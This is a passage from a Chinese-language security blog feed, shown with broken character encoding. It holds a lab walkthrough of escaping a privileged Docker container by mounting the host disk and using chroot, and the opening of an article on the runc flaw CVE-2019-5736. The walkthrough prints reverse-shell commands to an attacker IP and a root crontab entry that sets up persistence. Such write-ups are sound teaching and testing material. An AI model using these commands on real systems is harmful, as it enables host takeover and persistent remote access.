â€“privileged=trueå‚æ•°ï¼Œå°†å®¹å™¨ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> run <span class="token parameter variable">-itd</span> <span class="token parameter variable">--name</span> privilegeTestUbuntu <span class="token parameter variable">--privileged</span> ubuntu:18.04<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‘½ä»¤è¯¦è§£ï¼š</p><ul><li><code>docker run</code>: åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨.</li><li><code>-itd</code>ï¼š<ul><li><code>-i</code> æˆ– <code>--interactive</code>: ä¿æŒæ ‡å‡†è¾“å…¥ï¼ˆSTDINï¼‰æ‰“å¼€ï¼Œå³ä½¿ä¸é™„åŠ åˆ°å®¹å™¨ç»ˆç«¯.</li><li><code>-t</code> æˆ– <code>--tty</code>: åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯.</li><li><code>-d</code> æˆ– <code>--detach</code>: åœ¨åå°è¿è¡Œå®¹å™¨å¹¶è¿”å›å®¹å™¨ID.</li></ul></li><li><code>--name privilegeTestUbuntu</code>: ä¸ºå®¹å™¨æŒ‡å®šä¸€ä¸ªåç§°</li><li><code>--privileged</code>: ä»¥ç‰¹æƒæ¨¡å¼è¿è¡Œå®¹å™¨. è¿™å°†ç»™äºˆå®¹å™¨å‡ ä¹ä¸å®¿ä¸»æœºç›¸åŒçš„æƒé™ï¼Œä½¿å…¶å¯ä»¥è®¿é—®å®¿ä¸»æœºçš„æ‰€æœ‰è®¾å¤‡ã€æ–‡ä»¶ç³»ç»Ÿç­‰.</li></ul></blockquote><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.21.45.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.22.04.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.22.41.png" alt="è¿›å…¥å®¹å™¨" style="zoom:50%;"><ul><li>åœ¨k8sä¸­ï¼Œåœ¨podçš„yamlé…ç½®ä¸­æ·»åŠ å¦‚ä¸‹é…ç½®æ—¶ï¼Œä¹Ÿä¼šä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨å®¹å™¨</li></ul><pre class="line-numbers language-none"><code class="language-none">securityContext:      privileged: true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2009.46.43.png" style="zoom:50%;"><p>ï¼ˆ2ï¼‰ ç‰¹æƒæ¨¡å¼èµ·çš„å®¹å™¨ï¼Œå®æˆ˜ä¸­å¯é€šè¿‡<code>cat /proc/self/status |grep Cap</code>å‘½ä»¤åˆ¤æ–­å½“å‰å®¹å™¨æ˜¯å¦é€šè¿‡ç‰¹æƒæ¨¡å¼èµ·ï¼ˆ0000001fffffffffä»£è¡¨ä¸ºç‰¹æƒæ¨¡å¼èµ·åŠ¨ï¼‰</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.23.28.png" alt="æˆªå±2025-01-07 10.23.28" style="zoom:50%;"><p>å…³æ³¨CapEffçš„å€¼ï¼Œ0000001fffffffffä»£è¡¨ä¸ºç‰¹æƒæ¨¡å¼èµ·åŠ¨ï¼ˆå­˜ç–‘ï¼‰ã€‚</p><h2 id="3-2-å°†å®¿ä¸»æœºæ ¹ç›®å½•æŒ‚è½½è¿›å®¹å™¨ç›®å½•"><a href="#3-2-å°†å®¿ä¸»æœºæ ¹ç›®å½•æŒ‚è½½è¿›å®¹å™¨ç›®å½•" class="headerlink" title="3.2 å°†å®¿ä¸»æœºæ ¹ç›®å½•æŒ‚è½½è¿›å®¹å™¨ç›®å½•"></a>3.2 å°†å®¿ä¸»æœºæ ¹ç›®å½•æŒ‚è½½è¿›å®¹å™¨ç›®å½•</h2><p>fdisk -lå‘½ä»¤æŸ¥çœ‹å®¿ä¸»æœºè®¾å¤‡ä¸º/dev/vda1</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.24.12.png" style="zoom:50%;"><p>é€šè¿‡mountå‘½ä»¤å°†å®¿ä¸»æœºæ ¹ç›®å½•æŒ‚è½½è¿›å®¹å™¨ç›®å½•çš„testä¸­</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/sda1 /home/test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.25.22.png" style="zoom:50%;"><p>/home/test ç›®å½•ä¸­æŒ‚è½½è¿‡æ¥çš„å†…å®¹å¹¶ä¸æ˜¯å®¿ä¸»æœºçš„æ ¹ç›®å½•ã€‚</p><h2 id="3-3-æ”¹å˜æ ¹ç›®å½•ï¼Œå†™å®¿ä¸»æœºç›®å½•"><a href="#3-3-æ”¹å˜æ ¹ç›®å½•ï¼Œå†™å®¿ä¸»æœºç›®å½•" class="headerlink" title="3.3 æ”¹å˜æ ¹ç›®å½•ï¼Œå†™å®¿ä¸»æœºç›®å½•"></a>3.3 æ”¹å˜æ ¹ç›®å½•ï¼Œå†™å®¿ä¸»æœºç›®å½•</h2><p>ä½¿ç”¨chrootæ”¹å˜æ ¹ç›®å½•</p><p>chroot /home/test/</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.01.17.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.26.01.png" alt="chrootå¤±è´¥" style="zoom:50%;"><p>å®¹å™¨ä¸­æ²¡æœ‰ /bin/shï¼Œä»å®¿ä¸»æœºå¤åˆ¶ä¸€ä¸ªè¿›å»è¯•ä¸€ä¸‹ï¼š</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.04.02.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.04.26.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.05.36.png" style="zoom:50%;"><p>è¿˜æ˜¯æŠ¥é”™ã€‚</p><p>å¤ç°å¤±è´¥ã€‚</p><h1 id="å››ã€é€ƒé€¸å¤ç°ï¼ˆubuntu14-04å¤ç°æˆåŠŸï¼‰"><a href="#å››ã€é€ƒé€¸å¤ç°ï¼ˆubuntu14-04å¤ç°æˆåŠŸï¼‰" class="headerlink" title="å››ã€é€ƒé€¸å¤ç°ï¼ˆubuntu14.04å¤ç°æˆåŠŸï¼‰"></a>å››ã€é€ƒé€¸å¤ç°ï¼ˆubuntu14.04å¤ç°æˆåŠŸï¼‰</h1><p>å…·ä½“ç¯å¢ƒè§æœ¬ç«™ã€Šä¸‰å±‚ç½‘ç»œåŸŸæ¸—é€é¶åœºï¼ˆWHOAMIIï¼‰æ­å»ºã€‹ä¸€æ–‡ï¼Œubuntuç³»ç»Ÿä¸ºç¯å¢ƒä¸­å¯¹åº”çš„åä¸ºweb2çš„ç³»ç»Ÿã€‚</p><h2 id="4-1-åˆ¤æ–­Dockerå®¹å™¨æ˜¯å¦æ˜¯ç‰¹æƒæ¨¡å¼"><a href="#4-1-åˆ¤æ–­Dockerå®¹å™¨æ˜¯å¦æ˜¯ç‰¹æƒæ¨¡å¼" class="headerlink" title="4.1 åˆ¤æ–­Dockerå®¹å™¨æ˜¯å¦æ˜¯ç‰¹æƒæ¨¡å¼"></a>4.1 åˆ¤æ–­Dockerå®¹å™¨æ˜¯å¦æ˜¯ç‰¹æƒæ¨¡å¼</h2><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.33.52.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.31.03.png" style="zoom:50%;"><p>å¦‚æœæ˜¯ä»¥ç‰¹æƒæ¨¡å¼å¯åŠ¨çš„è¯ï¼ŒCapEffå¯¹åº”çš„æ©ç å€¼åº”è¯¥ä¸º0000003fffffffffã€‚</p><h2 id="4-2-æŸ¥çœ‹ç³»ç»Ÿç›®å½•"><a href="#4-2-æŸ¥çœ‹ç³»ç»Ÿç›®å½•" class="headerlink" title="4.2 æŸ¥çœ‹ç³»ç»Ÿç›®å½•"></a>4.2 æŸ¥çœ‹ç³»ç»Ÿç›®å½•</h2><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.34.39.png" style="zoom:50%;"><blockquote><p><code>fdisk -l</code> æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„å‘½ä»¤ï¼Œç”¨äºåˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰å¯ç”¨çš„ç£ç›˜åˆ†åŒºä¿¡æ¯ã€‚<code>fdisk</code> æ˜¯ä¸€ä¸ªç£ç›˜åˆ†åŒºè¡¨æ“ä½œå·¥å…·ï¼Œè€Œ <code>-l</code> é€‰é¡¹ç”¨äºåˆ—å‡ºæ‰€æœ‰åˆ†åŒºè¡¨ä¿¡æ¯ï¼Œè€Œä¸è¿›è¡Œä»»ä½•ä¿®æ”¹ã€‚</p></blockquote><p>å®¿ä¸»æœºæ ¹ç›®å½•ä¸º /dev/sda1</p><h2 id="4-3-æŒ‚è½½ç³»ç»Ÿç›®å½•"><a href="#4-3-æŒ‚è½½ç³»ç»Ÿç›®å½•" class="headerlink" title="4.3 æŒ‚è½½ç³»ç»Ÿç›®å½•"></a>4.3 æŒ‚è½½ç³»ç»Ÿç›®å½•</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/sda1 /home/test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.36.18.png" style="zoom:50%;"><h2 id="4-4-chrootæ”¹å˜æ ¹ç›®å½•"><a href="#4-4-chrootæ”¹å˜æ ¹ç›®å½•" class="headerlink" title="4.4 chrootæ”¹å˜æ ¹ç›®å½•"></a>4.4 chrootæ”¹å˜æ ¹ç›®å½•</h2><p>ä½¿ç”¨chrootæ”¹å˜æ ¹ç›®å½•è¿›å…¥åˆ°å®¿ä¸»æœºçš„ç£ç›˜ç©ºé—´ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chroot</span> /home/test/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.37.51.png" style="zoom:50%;"><h2 id="4-5-æ”»å‡»ç«¯ç›‘å¬åå¼¹shell"><a href="#4-5-æ”»å‡»ç«¯ç›‘å¬åå¼¹shell" class="headerlink" title="4.5 æ”»å‡»ç«¯ç›‘å¬åå¼¹shell"></a>4.5 æ”»å‡»ç«¯ç›‘å¬åå¼¹shell</h2><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.40.03.png" style="zoom:50%;"><p>è¿™é‡Œkaliçš„ip 192.168.52.5/24ï¼Œå—å®³ä¸»æœºçš„ipä¸º 192.168.52.20/24ã€‚å…·ä½“æ”»å‡»åœºæ™¯ä¸­ï¼Œå¦‚æœå—å®³ä¸»æœºå¯ä»¥å‡ºç½‘ï¼Œæ”»å‡»è€…å¯ä»¥ç”¨å…¬ç½‘çš„VPSæ¥ä»‹ç»åå¼¹çš„shellè¿æ¥ã€‚</p><h2 id="4-6-ç›´æ¥æ‰§è¡Œå‘½ä»¤æˆ–å†™crontab"><a href="#4-6-ç›´æ¥æ‰§è¡Œå‘½ä»¤æˆ–å†™crontab" class="headerlink" title="4.6 ç›´æ¥æ‰§è¡Œå‘½ä»¤æˆ–å†™crontab"></a>4.6 ç›´æ¥æ‰§è¡Œå‘½ä»¤æˆ–å†™crontab</h2><h3 id="4-6-1-ç›´æ¥æ‰§è¡Œåå¼¹shellçš„å‘½ä»¤"><a href="#4-6-1-ç›´æ¥æ‰§è¡Œåå¼¹shellçš„å‘½ä»¤" class="headerlink" title="4.6.1 ç›´æ¥æ‰§è¡Œåå¼¹shellçš„å‘½ä»¤"></a>4.6.1 ç›´æ¥æ‰§è¡Œåå¼¹shellçš„å‘½ä»¤</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/192.168.52.5/4444 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.55.59.png" style="zoom:50%;"><p>ç›´æ¥æ‰§è¡Œå¤±è´¥ã€‚chrootä¹‹åè¿›å…¥çš„æ˜¯å®¿ä¸»æœºçš„ç›®å½•ï¼Œä½†æ˜¯å¹¶ä¸å…·å¤‡ç›´æ¥åœ¨å®¿ä¸»æœºæ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚å¯ä»¥é€šè¿‡æ“ä½œå®¿ä¸»æœºæ–‡ä»¶ï¼ˆå®šæ—¶ä»»åŠ¡é…ç½®æ–‡ä»¶ï¼‰çš„æ–¹å¼æ¥å®ç°åå¼¹shellã€‚</p><h3 id="4-6-2-å®šæ—¶ä»»åŠ¡"><a href="#4-6-2-å®šæ—¶ä»»åŠ¡" class="headerlink" title="4.6.2 å®šæ—¶ä»»åŠ¡"></a>4.6.2 å®šæ—¶ä»»åŠ¡</h3><ul><li>å°è¯•ç›´æ¥å†™å®šæ—¶ä»»åŠ¡ï¼š</li></ul><pre class="line-numbers language-none"><code class="language-none">crontab -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.58.37.png" alt="æˆªå±2025-01-07 10.58.37" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2010.59.27.png" alt="æˆªå±2025-01-07 10.59.27" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.00.15.png" style="zoom:50%;"><p>å†™å…¥å¤±è´¥ã€‚</p><ul><li>ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š</li></ul><p>å°è¯•åœ¨chrootä¹‹å‰ï¼ˆæˆ–è€…exité€€å‡ºchrootçš„ç›®å½•ä¹‹åï¼‰ç›´æ¥å†™å…¥/home/test/etc/crontab é…ç½®æ–‡ä»¶ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.52.5/5555 0&gt;&amp;1"</span> <span class="token operator">&gt;&gt;</span> /home/test/etc/crontabï¼ˆæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.19.08.png" style="zoom:50%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.20.42.png" alt="è·å–åå¼¹shellå¤±è´¥" style="zoom:40%;"><p>è·å–åå¼¹shellå¤±è´¥ã€‚</p><h3 id="4-6-3-å…ˆåˆ›å»ºä»»åŠ¡è„šæœ¬å†åˆ›å»ºä»»åŠ¡æ‰§è¡Œ"><a href="#4-6-3-å…ˆåˆ›å»ºä»»åŠ¡è„šæœ¬å†åˆ›å»ºä»»åŠ¡æ‰§è¡Œ" class="headerlink" title="4.6.3 å…ˆåˆ›å»ºä»»åŠ¡è„šæœ¬å†åˆ›å»ºä»»åŠ¡æ‰§è¡Œ"></a>4.6.3 å…ˆåˆ›å»ºä»»åŠ¡è„šæœ¬å†åˆ›å»ºä»»åŠ¡æ‰§è¡Œ</h3><p>å°†bashåå¼¹å‘½ä»¤å†™å…¥åˆ°åˆ›å»ºçš„shæ–‡ä»¶é‡Œé¢ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"bash -i &gt;&amp; /dev/tcp/192.168.52.5/4444 0&gt;&amp;1"</span> <span class="token operator">&gt;</span>/home/test/hacker.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.05.50.png" style="zoom:50%;"><p>è®¾ç½®è„šæœ¬çš„æƒé™ï¼š</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.05.30.png" style="zoom:60%;"><p>åœ¨ç¼–å†™è®¡åˆ’ä»»åŠ¡åˆ°/hacker/etc/crontabæ–‡ä»¶ä¸­ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"* * * * * root bash /hacker.sh"</span> <span class="token operator">&gt;&gt;</span> /hacker/etc/crontabï¼ˆæ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.07.14.png" style="zoom:50%;"><h2 id="4-7-æ”»å‡»ç«¯æ¥æ”¶åå¼¹shell"><a href="#4-7-æ”»å‡»ç«¯æ¥æ”¶åå¼¹shell" class="headerlink" title="4.7 æ”»å‡»ç«¯æ¥æ”¶åå¼¹shell"></a>4.7 æ”»å‡»ç«¯æ¥æ”¶åå¼¹shell</h2><p>ç”±äºå®šæ—¶ä»»åŠ¡æ˜¯æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ï¼Œæ‰€ä»¥æœ‰å¯èƒ½éœ€è¦ç¨å¾®ç­‰å¾…ä¸€ä¼šå„¿ã€‚</p><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.09.39.png" style="zoom:40%;"><img src="/2025/01/07/lou-dong-zhi-shi-ku/docker-te-quan-mo-shi-rong-qi-tao-yi/%E6%88%AA%E5%B1%8F2025-01-07%2011.12.18.png" style="zoom:40%;"><p>æ”»å‡»ç«¯æˆåŠŸè·å–åˆ°rootæƒé™çš„shellã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> å®¹å™¨é€ƒé€¸ </tag>
            
            <tag> dockerå®¹å™¨é€ƒé€¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dockerå®¹å™¨é€ƒé€¸-CVE-2019-5736</title>
      <link href="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/"/>
      <url>/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€æ¼æ´æ¦‚è¿°"><a href="#ä¸€ã€æ¼æ´æ¦‚è¿°" class="headerlink" title="ä¸€ã€æ¼æ´æ¦‚è¿°"></a>ä¸€ã€æ¼æ´æ¦‚è¿°</h1><h2 id="1-1-ç®€ä»‹"><a href="#1-1-ç®€ä»‹" class="headerlink" title="1.1 ç®€ä»‹"></a>1.1 ç®€ä»‹</h2><p>CVE-2019-5736æ˜¯ä¸€ä¸ªä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œå®ƒå½±å“äº†åŒ…æ‹¬Dockerã€containerdã€Podmanå’ŒCRI-Oåœ¨å†…çš„å¤šç§å®¹å™¨è¿è¡Œæ—¶ç¯å¢ƒã€‚è¯¥æ¼æ´å…è®¸æ¶æ„å®¹å™¨é€šè¿‡è¦†ç›–å®¿ä¸»æœºä¸Šçš„runcå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå®ç°ä»å®¹å™¨åˆ°å®¿ä¸»æœºçš„é€ƒé€¸ï¼Œä»è€Œè·å¾—å®¿ä¸»æœºçš„rootæƒé™ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹æ‰§è¡Œä»»æ„ä»£ç ï¼Œå¯¹å®¿ä¸»æœºåŠå…¶ä¸Šæ‰€æœ‰å®¹å™¨æ„æˆä¸¥é‡å¨èƒã€‚</p><blockquote><p>Docker Runcæ˜¯ä»€ä¹ˆï¼Ÿ</p><p>Docker Runc æ˜¯ä¸€ä¸ªè½»é‡çº§çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºåˆ›å»ºå’Œç®¡ç†ç¬¦åˆ Open Container Initiative (OCI) æ ‡å‡†çš„å®¹å™¨ã€‚å®ƒæ˜¯ç”± Docker å›¢é˜Ÿå¼€å‘ï¼Œå¹¶è´¡çŒ®ç»™äº†å¼€æ”¾å®¹å™¨è®¡åˆ’ (OCI)ã€‚runc çš„ä¸»è¦åŠŸèƒ½æ˜¯ä½œä¸º OCI å®¹å™¨è¿è¡Œæ—¶çš„å‚è€ƒå®ç°ï¼Œè´Ÿè´£å®¹å™¨çš„å¯åŠ¨ã€åœæ­¢ã€æš‚åœå’Œåˆ é™¤ç­‰æ“ä½œã€‚</p><p>runc ä¸ Docker çš„å…³ç³»éå¸¸å¯†åˆ‡ã€‚Docker ä½¿ç”¨ runc ä½œä¸ºå…¶å®¹å™¨è¿è¡Œæ—¶ï¼Œè¿™æ„å‘³ç€å½“ä½ ä½¿ç”¨ Docker è¿è¡Œå®¹å™¨æ—¶ï¼Œå®é™…ä¸Šæ˜¯é€šè¿‡ Docker è°ƒç”¨ runc æ¥å®Œæˆå®¹å™¨çš„åˆ›å»ºå’Œç®¡ç†ã€‚runc æä¾›äº†ä¸€å¥—å‘½ä»¤è¡Œå·¥å…·ï¼Œä¾›ç”¨æˆ·å’Œä¸Šå±‚å®¹å™¨ç®¡ç†å·¥å…·ï¼ˆå¦‚ Dockerã€Kubernetes ç­‰ï¼‰è°ƒç”¨ï¼Œä½œä¸ºå®¹å™¨ç”Ÿæ€ä¸­çš„åŸºç¡€ç»„ä»¶ï¼Œrunc æä¾›äº†å¯¹å®¹å™¨ç”Ÿå‘½å‘¨æœŸçš„åº•å±‚ç®¡ç†ã€‚</p><p>ä¸‹å›¾æ˜¯ä¸€å¼ Dockerç»„ä»¶æ¶æ„å›¾ï¼Œæè¿°äº†Dockerè¿è¡Œå®¹å™¨æ—¶æ‰€ä¾èµ–çš„ä¸€äº›ç»„ä»¶ï¼Œè¿‘äº›å¹´åŸºäºç»„ä»¶çš„Dockerå®¹å™¨é€ƒé€¸æ¼æ´å¤§å¤šå‘ç”Ÿåœ¨shimç»„ä»¶å’Œruncç»„ä»¶ä¸Šã€‚</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-07%2009.34.52.png" alt="dockerç»„ä»¶æ¶æ„" style="zoom:29%;"><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-07%2009.41.42.png" style="zoom:40%;"></blockquote><h2 id="1-2-å½±å“èŒƒå›´"><a href="#1-2-å½±å“èŒƒå›´" class="headerlink" title="1.2 å½±å“èŒƒå›´"></a>1.2 å½±å“èŒƒå›´</h2><ul><li>Docker Version &lt; 18.09.2</li><li>runC Version &lt;= 1.0-rc6</li></ul><h2 id="1-3-æ¼æ´æˆå› "><a href="#1-3-æ¼æ´æˆå› " class="headerlink" title="1.3 æ¼æ´æˆå› "></a>1.3 æ¼æ´æˆå› </h2><p>è¯¥æ¼æ´çš„æˆå› ä¸Linuxçš„pidå‘½åç©ºé—´å’Œ/procä¼ªæ–‡ä»¶ç³»ç»Ÿæœ‰å…³ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œé€šè¿‡ä¿®æ”¹å®¹å™¨å†…çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè·å–å®¿ä¸»æœºä¸Šruncå¯æ‰§è¡Œæ–‡ä»¶çš„æ–‡ä»¶å¥æŸ„ï¼Œç„¶åè¿›è¡Œè¦†ç›–æ“ä½œï¼Œå°†runcæ›¿æ¢ä¸ºå¯æ§çš„æ¶æ„æ–‡ä»¶ï¼Œæœ€ç»ˆåœ¨å®¿ä¸»æœºä¸Šä»¥rootæƒé™æ‰§è¡Œä»»æ„ä»£ç ã€‚å—å½±å“çš„ç‰ˆæœ¬åŒ…æ‹¬Docker 18.09.2ä¹‹å‰ä»¥åŠruncç‰ˆæœ¬ä½äº1.0-rc6çš„ç³»ç»Ÿã€‚</p><h1 id="äºŒã€æ¼æ´å¤ç°ï¼ˆubuntu-14-04å¤ç°å¤±è´¥ï¼‰"><a href="#äºŒã€æ¼æ´å¤ç°ï¼ˆubuntu-14-04å¤ç°å¤±è´¥ï¼‰" class="headerlink" title="äºŒã€æ¼æ´å¤ç°ï¼ˆubuntu 14.04å¤ç°å¤±è´¥ï¼‰"></a>äºŒã€æ¼æ´å¤ç°ï¼ˆubuntu 14.04å¤ç°å¤±è´¥ï¼‰</h1><p>åšè¿™ä¸ªæ¼æ´å¤ç°çš„æ—¶å€™è®°å¾—å¯¹è™šæ‹Ÿæœºåšå¿«ç…§ï¼Œæ–¹ä¾¿æ¢å¤ï¼Œå› ä¸ºæ¶‰åŠåˆ°runcæ–‡ä»¶çš„æ¶æ„è¦†ç›–ä¼šå½±å“åˆ°å®¹å™¨çš„æ­£å¸¸å¯åŠ¨ã€‚</p><h2 id="2-1-å®éªŒç¯å¢ƒ"><a href="#2-1-å®éªŒç¯å¢ƒ" class="headerlink" title="2.1 å®éªŒç¯å¢ƒ"></a>2.1 å®éªŒç¯å¢ƒ</h2><ul><li>ubuntu ï¼šuname -a</li></ul><p>Linux ubuntu 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-06%2016.15.48.png" style="zoom:60%;"><ul><li><p>dockerï¼šdocker -v<br>Docker version 18.06.3-ce, build d7080c1</p></li><li><p>runcç‰ˆæœ¬ï¼š1.0-rc5</p></li></ul><blockquote><p>runcç‰ˆæœ¬å¦‚ä½•æŸ¥çœ‹ï¼Ÿ</p><p>1ï¼‰docker info æŸ¥çœ‹runcç›¸å…³çš„ä¿¡æ¯</p><img src="/2025/01/03/lou-dong-zhi-shi-ku/docker-rong-qi-tao-yi-cve-2019-5736/%E6%88%AA%E5%B1%8F2025-01-03%2013.53.57.png" style="zoom:50%;"><p>åœ¨Dockerç¯å¢ƒä¸­ï¼Œ<code>runc</code>æ˜¯ä¸€ä¸ªè½»é‡çº§çš„å®¹å™¨è¿è¡Œæ—¶ï¼Œå®ƒè´Ÿè´£æ ¹æ®Dockeré•œåƒåˆ›å»ºå¹¶è¿è¡Œå®¹å™¨ã€‚å½“ä½ çœ‹åˆ°<code>runc 